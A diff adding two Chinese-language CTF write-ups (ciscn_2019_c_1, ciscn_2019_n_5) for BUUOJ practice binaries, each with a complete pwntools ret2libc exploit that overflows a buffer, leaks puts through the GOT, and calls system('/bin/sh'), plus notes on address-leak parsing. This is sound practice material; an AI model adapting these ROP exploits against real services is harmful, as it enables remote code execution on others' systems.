@@ -402,3 +402,128 @@ payload3=b'a'*(0xe7+4)+p32(system_addr)+p32(0)+p32(bin_sh_addr)
 r.sendline(payload3)
 r.interactive()
 ```
+
+
+## ciscn_2019_c_1
+
+>知识点：ret2libc
+
+```python
+from pwn import*
+from LibcSearcher import*
+ 
+r=remote('node5.buuoj.cn',26681)
+elf=ELF('./3')
+ 
+main = 0x400B28
+pop_rdi = 0x400c83
+ret = 0x4006b9
+ 
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+ 
+r.sendlineafter('Input your choice!\n','1')
+offset = 0x50+8
+payload = b'\x00'+b'a'*(offset-1)
+payload=payload+p64(pop_rdi)
+payload=payload+p64(puts_got)
+payload=payload+p64(puts_plt)
+payload=payload+p64(main)
+r.sendlineafter('Input your Plaintext to be encrypted\n',payload)
+r.recvline()
+r.recvline()
+puts_addr=u64(r.recvuntil('\n')[:-1].ljust(8,b'\0'))
+print(hex(puts_addr))
+libc = LibcSearcher('puts',puts_addr)
+Offset = puts_addr - libc.dump('puts')
+binsh = Offset+libc.dump('str_bin_sh')
+system = Offset+libc.dump('system')
+r.sendlineafter('Input your choice!\n','1')
+payload = b'\x00'+b'a'*(offset-1)
+payload=payload+p64(ret)
+payload=payload+p64(pop_rdi)
+payload=payload+p64(binsh)
+payload=payload+p64(system)
+r.sendlineafter('Input your Plaintext to be encrypted\n',payload)
+ 
+r.interactive()
+```
+
+## ciscn_2019_n_5
+ 知识点：ret2libc或ret2shellcode
+
+ ![alt text](image-14.png)
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char text[30]; // [rsp+0h] [rbp-20h] BYREF
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts("tell me your name");
+  read(0, name, 0x64uLL);
+  puts("wow~ nice name!");
+  puts("What do you want to say to me?");
+  gets(text);
+  return 0;
+}
+
+```
+
+ 发现什么保护都没开，可以考虑ret2libc和ret2shellcode
+
+ 方法一：先用ret2libc，更熟悉这个一些
+ 发现没什么弯弯绕绕，就可以直接泄漏libc基址
+ exp:
+ ```python
+from pwn import*
+from LibcSearcher import*
+r=remote('node5.buuoj.cn',27924)
+elf=ELF('./1')
+main = 0x0400636
+pop_rdi = 0x00400713
+ret = 0x04004c9 
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+r.sendlineafter('your name','aaa')
+offset = 0x28
+payload =b'a'*offset
+payload=payload+p64(pop_rdi)
+payload=payload+p64(puts_got)
+payload=payload+p64(puts_plt)
+payload=payload+p64(main)
+r.sendlineafter(' me?',payload)
+puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+print(hex(puts_addr))
+libc = LibcSearcher('puts',puts_addr)
+Offset = puts_addr - libc.dump('puts')
+binsh = Offset+libc.dump('str_bin_sh')
+system = Offset+libc.dump('system')
+r.sendlineafter('your name','aaa')
+payload = b'a'*offset
+payload=payload+p64(ret)
+payload=payload+p64(pop_rdi)
+payload=payload+p64(binsh)
+payload=payload+p64(system)
+r.sendlineafter('me?',payload)
+r.interactive()
+ ```
+ 之前由于不理解，一直用的是
+ ```python
+ u64(r.recvuntil('\n')[:-1].ljust(8,b'\0'))
+ ```
+ 这段代码的意思是，尝试接收输出，直到遇到换行符 \n，然后去掉这个换行符，将剩余部分补齐至 8 字节并解析为地址，但是在二进制漏洞利用中，程序输出可能包含​​非地址信息​​（例如，调试信息、其他函数的多余输出等）。如果这些额外数据被 recvuntil('\n')接收并包含在字符串中，u64尝试将无效数据解析为地址就会失败，导致后续计算全部错误
+ 这道题用这个便导致后面的计算全部有问题
+ ```python
+puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+ ```
+ >r.recvuntil(b'\x7f'):持续接收数据，直到遇到字节 \x7f。在 ​​64 位 Linux 系统​​中，libc 地址的​​典型特征是高字节以 \x7f开头​​（例如，常见的地址形式是 0x7fxxxxxxxxxx）。这是一个非常显著的特征
+
+ >[-6:]: 字节取最后接收到的 6 个字节。因为 \x7f是地址的最高位字节（在 Little-Endian 字节序下，它出现在地址数据的末尾），它之后的 6 个字节很可能就是地址的有效低位部分。
+
+ >.ljust(8, b'\x00')：将这 6 个字节左对齐补齐到 8 字节，并用 \x00填充高位。这是因为 64 位地址是 8 字节的，而 u64函数需要 8 字节的数据来解析。
+
+ 方法二：
+骗人的，没有第二种方法
+![alt text](image-15.png)
+网上的name是具有可执行权限的，而我查出来的是没有的
